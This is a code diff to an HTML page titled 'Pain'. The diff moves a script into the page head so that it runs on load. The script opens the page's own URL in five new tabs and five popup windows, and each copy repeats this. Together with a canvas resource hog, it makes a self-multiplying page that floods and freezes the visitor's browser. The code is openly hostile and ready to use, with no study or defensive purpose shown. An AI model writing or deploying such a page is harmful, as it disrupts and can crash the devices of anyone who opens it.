@@ -6,6 +6,22 @@
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Pain</title>
+        <script>
+            const currentURL = window.location.href;
+
+            const dupeAmountTabs = 5;
+            const dupeAmountWindows = 5;
+            const windowFeatures =
+                "popup=true,width=256,height=256,scrollbar=no,resizable=yes";
+
+            for (let i = 0; i < dupeAmountTabs; i++) {
+                window.open(currentURL, "_blank");
+            }
+
+            for (let i = 0; i < dupeAmountTabs; i++) {
+                window.open(currentURL, "_blank", windowFeatures);
+            }
+        </script>
         <style>
             body {
                 background-color: #111;
@@ -52,22 +68,6 @@
                     data[i] = Math.random() * 255;
                 }
                 document.body.appendChild(canvas);
-            }
-
-
-            const currentURL = window.location.href;
-
-            const dupeAmountTabs = 5;
-            const dupeAmountWindows = 5;
-            const windowFeatures =
-                "popup=true,width=256,height=256,scrollbar=no,resizable=yes";
-
-            for (let i = 0; i < dupeAmountTabs; i++) {
-                window.open(currentURL, "_blank");
-            }
-
-            for (let i = 0; i < dupeAmountTabs; i++) {
-                window.open(currentURL, "_blank", windowFeatures);
             }
 
             canvasHog();
